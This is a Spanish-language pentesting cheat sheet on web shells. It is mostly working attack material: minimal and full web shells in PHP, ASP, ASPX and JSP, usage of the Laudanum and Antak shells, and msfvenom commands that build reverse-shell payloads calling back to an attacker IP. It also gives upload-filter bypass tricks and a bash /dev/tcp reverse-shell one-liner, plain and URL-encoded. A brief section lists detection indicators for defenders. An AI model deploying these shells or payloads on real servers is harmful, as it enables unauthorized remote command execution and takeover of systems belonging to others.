# WebShells

Una **web shell** es un script malicioso subido a un servidor web que permite al atacante ejecutar comandos en el servidor a través del navegador. A diferencia de las reverse shells o bind shells, las web shells no requieren una conexión de red directa — la comunicación ocurre a través del protocolo HTTP/HTTPS normal, lo que las hace difíciles de detectar y bloquear.

El vector de ataque más común es una vulnerabilidad de **Unrestricted File Upload**: el servidor permite subir archivos sin validar correctamente el tipo de contenido.

### Tipos de web shells

#### PHP

PHP es el lenguaje de servidor web más común. Una web shell mínima en PHP:

```php
<?php system($_GET['cmd']); ?>
```

Uso: `http://objetivo/shell.php?cmd=id`

**Versión más completa con salida HTML:**

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
?>
<form method="GET">
    <input type="text" name="cmd" />
    <input type="submit" value="Ejecutar" />
</form>
```

**PHP con ejecución de comandos más sigilosa:**

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>
```

#### ASP / ASPX (IIS)

```asp
<%
Dim cmd
cmd = Request.QueryString("cmd")
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("cmd.exe /c " & cmd & " > C:\inetpub\wwwroot\out.txt", 0, True)
%>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if(cmd != null) {
            Response.Write(new System.Diagnostics.Process(){
                StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd) {
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                }
            }.Start() ? new StreamReader(new System.Diagnostics.Process(){
                StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd) {
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                }
            }.StandardOutput).ReadToEnd() : "error");
        }
    }
</script>
```

#### JSP (Java / Tomcat)

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        Scanner sc = new Scanner(in);
        while(sc.hasNextLine()) out.println(sc.nextLine());
    }
%>
```

### Laudanum — Web shells pre-construidas

**Laudanum** es una colección de web shells en múltiples lenguajes mantenida para uso en pentests. En Kali está disponible en:

```bash
ls /usr/share/laudanum/
# asp/  aspx/  cfm/  jsp/  php/  ...

# Para usarla: copiar el archivo y personalizarlo (cambiar la IP del atacante)
cp /usr/share/laudanum/php/shell.php /tmp/shell.php
```

Las shells de Laudanum suelen incluir:

* Ejecución de comandos
* Navegación del sistema de archivos
* Upload/download de archivos
* Conexión de reverse shell desde la webshell

### Antak Webshell (PowerShell)

**Antak** es una web shell de PowerShell incluida en el framework Nishang. Ofrece una interfaz similar a PowerShell ISE directamente en el navegador.

```bash
# En Kali
locate antak.aspx
# /usr/share/nishang/Antak-WebShell/antak.aspx

# Personalizar: editar las credenciales de acceso
# Buscar "Antak" en el archivo y cambiar usuario/contraseña
```

Características de Antak:

* Interfaz web con historial de comandos
* Ejecuta comandos PowerShell directamente
* Permite subir y descargar archivos
* Codifica los comandos en base64 automáticamente para evitar problemas de caracteres

### Generación con MSFvenom

```bash
# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw > shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f asp > shell.asp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx > shell.aspx

# WAR (Tomcat/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war
```

### Metodología para subir y ejecutar una web shell

1. **Identificar el vector de upload** — formulario de subida de archivos, perfil de usuario, editor de contenido, endpoint API...
2. **Determinar el lenguaje del servidor** — extensión de las páginas existentes, headers de respuesta (`X-Powered-By`), errores, Wappalyzer
3. **Intentar subir la web shell** — algunos filtros se bypassean cambiando la extensión (`.php5`, `.phtml`, `.pHp`), el Content-Type, o añadiendo magic bytes al principio del archivo
4. **Localizar el archivo subido** — buscar en paths comunes: `/uploads/`, `/files/`, `/media/`, `/images/`
5. **Ejecutar y obtener acceso** — llamar a la web shell desde el navegador
6. **Escalar a reverse shell** — desde la web shell ejecutar un one-liner de reverse shell para obtener una sesión más estable:

```bash
# One-liner de reverse shell desde web shell PHP
# En el campo cmd= de la webshell:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# URL-encoded para pasar por el navegador:
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/443+0>%261'
```

### Detectar una web shell

Desde la perspectiva del Blue Team, los indicadores de una web shell son:

* Peticiones HTTP GET/POST con parámetros inusuales (`?cmd=`, `?exec=`, `?e=`)
* Respuestas HTTP con output de comandos del sistema (rutas, usuarios, procesos)
* Archivos con extensiones ejecutables en directorios de uploads (`.php`, `.asp`, `.jsp`)
* Acceso a archivos recién subidos desde IPs inusuales
* Comandos del sistema ejecutados por el proceso del servidor web (`apache`, `www-data`, `iis`)

> Una web shell activa es siempre preferible a una reverse shell durante el tiempo que dure el engagement, ya que si la reverse shell se cae la web shell sigue disponible como punto de re-entrada.

> Las web shells deben **eliminarse siempre** al finalizar el engagement. Dejar una web shell activa en un servidor cliente es un riesgo de seguridad grave — cualquier tercero que la descubra puede usarla.
